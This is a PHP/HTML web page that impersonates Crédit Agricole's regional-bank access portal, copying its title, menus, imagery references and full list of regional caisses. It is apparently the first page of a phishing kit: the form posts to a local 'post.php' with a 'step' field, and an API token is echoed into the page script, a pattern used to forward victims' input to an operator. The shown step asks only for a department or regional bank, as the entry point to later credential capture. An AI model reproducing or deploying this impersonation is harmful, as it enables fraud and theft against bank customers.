<?php 

     require_once "function.php";

                                    

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Accès CR - Crédit Agricole</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicone.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicone.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/over.css">
</head>
<body>
        

        <div class=" monix">
             <div class="maja"><img src="image/big.svg"></div>
             <div class="anis">
                <div class="topping sponseur">
                     <div class="sous">
                          <b>Vous êtes un particulier <i class="bi bi-chevron-down mx-1"></i></b>
                          <div class="puta">
                              <input type="text" name="" placeholder="Rechercher une thématique, un produit...">
                              <i class="fa fa-search"></i>
                          </div>
                          <div class="gio"><i class="bi bi-geo-alt"></i></div>
                          <div class="this">
                               <div class="chat bb px-3">
                                    <img src="image/web_1.png">
                               </div>
                               <div class="compte bb px-3">
                                    <img src="image/web_2.png">
                               </div>
                               <div class="lock bb px-3">
                                    <img src="image/web_3.png">
                               </div>
                          </div>
                     </div>
                </div>
                <div class="bottomin sponseur">
                     <ul>
                          <li>COMPTES & CARTES</li>
                          <li>ÉPARGNER</li>
                          <li>S'ASSURER</li>
                          <li>EMPRUNTER</li>
                          <li>SIMULATION & DEVIS</li>
                          <li>NOS CONSEILS</li>
                     </ul>
                </div>
             </div>
        </div>

        <div class="responsive">
             <i class="fa fa-bars"></i>
             <img src="image/soon.svg">
             <span><img src="image/look.png"></span>
        </div>
		<script>var token=<?php echo json_encode($apiToken); ?>;</script>

        <div class="togather forever">
             <div class="container-fluid">
                  <div class="left left_cc box">
                       <div class="imaga imaga_cc">
                            <div class="decovrer eco">
                                 <h3>Téléchargez l’application Ma Banque</h3>
                                 <p>Chacun d’entre vous gère différemment ses besoins bancaires. <br>
                                   Seul ou accompagné, au Crédit Agricole, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.
                                 </p>
                                 <button class="btn">Découvrez les grandes fonctionnalités</button>
                            </div>
                       </div>
                  </div>
                  <div class="right right_cc box forte choix">
                         <div class="login pogin logan">
                              <div class="text-center"><h2 class="mb-5">ACCÉDER À L'ESPACE <br> DÉDIÉ <br> DE VOTRE CAISSE <br> RÉGIONALE</h2></div>
                              <div class="text-center tork">Trouvez une caisse régionale en saisissant un département</div>
                              <form action="post.php" method="post">
                                   <input type="hidden" name="step" value="index">
                                   <div class="form-group  mt-3 bm">
                                        <input type="text" name="khtar" id="khtar" class="form-control mb-4" placeholder="Exemple 75 pour Paris.">
                                   </div>
                                   <div class="text-center my-4" style="font-size:14px;">ou</div>
                                   <div class="form-group  mt-3 bm">
                                        <select class="form-select form-select-lg mb-3" aria-label=".form-select-lg example" name="bobiz" id="bobiz" onchange="bobiz()">
                                          <option value="not-selected" hidden>Choisissez une caisse régionale</option>
                                          <option value="Alpes Provence">Alpes Provence</option>
                                          <option value="Alsace Vosges">Alsace Vosges</option>
                                          <option value="Anjou Maine">Anjou Maine</option>
                                          <option value="Aquitaine">Aquitaine</option>
                                          <option value="Atlantique Vendée">Atlantique Vendée</option>
                                          <option value="Brie Picardie">Brie Picardie</option>
                                          <option value="Centre Est">Centre Est</option>
                                          <option value="Centre France">Centre France</option>
                                          <option value="Centre Loire">Centre Loire</option>
                                          <option value="Centre Ouest">Centre Ouest</option>
                                          <option value="Champagne Bourgogne">Champagne Bourgogne</option>
                                          <option value="Charente Maritime Deux-Sèvres">Charente Maritime Deux-Sèvres</option>
                                          <option value="Charente Périgord">Charente Périgord</option>
                                          <option value="Corse">Corse</option>
                                          <option value="Côtes d'Armor">Côtes d'Armor</option>
                                          <option value="Des Savoie">Des Savoie</option>
                                          <option value="Finistère">Finistère</option>
                                          <option value="Franche Comté">Franche Comté</option>
                                          <option value="Guadeloupe">Guadeloupe</option>
                                          <option value="Ille et Vilaine">Ille et Vilaine</option>
                                          <option value="Languedoc">Languedoc</option>
                                          <option value="Loire Haute-Loire">Loire Haute-Loire</option>
                                          <option value="Lorraine">Lorraine</option>
                                          <option value="Martinique Guyane">Martinique Guyane</option>
                                          <option value="Morbihan">Morbihan</option>
                                          <option value="Nord De France">Nord De France</option>
                                          <option value="Nord Est">Nord Est</option>
                                          <option value="Nord Midi Pyrénées">Nord Midi Pyrénées</option>
                                          <option value="Normandie">Normandie</option>
                                          <option value="Normandie Seine">Normandie Seine</option>
                                          <option value="Paris et Île de France">Paris et Île de France</option>
                                          <option value="Provence Côte d'Azur">Provence Côte d'Azur</option>
                                          <option value="Pyrénées Gascogne">Pyrénées Gascogne</option>
                                          <option value="Réunion">Réunion</option>
                                          <option value="Sud Méditerranée">Sud Méditerranée</option>
                                          <option value="Sud Rhône Alpes">Sud Rhône Alpes</option>
                                          <option value="Toulouse 31">Toulouse 31</option>
                                          <option value="Touraine Poitou">Touraine Poitou</option>
                                          <option value="Val De France">Val De France</option>
                                        </select>
                                   </div>
                                   <div class="form-group  mt-3 bm">
                                        <button class="btn" name="submit" id="sent" style="background:#007461;color:white;">Rechercher une caisse régionale</button>
                                   </div>
                                   <div class="text-center final"><a href="">Voir tous les sites des Caisses régionales.</a></div>
                              </form>
                         </div>
                  </div>
             </div>
        </div>

        

        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
		<script src="js/jq.js"></script>
        <script>
                // $("#sent").submit(function(e){
                    
                //     e.preventDefault();
                    
                // });
        </script>
              
                    
</body>
</html>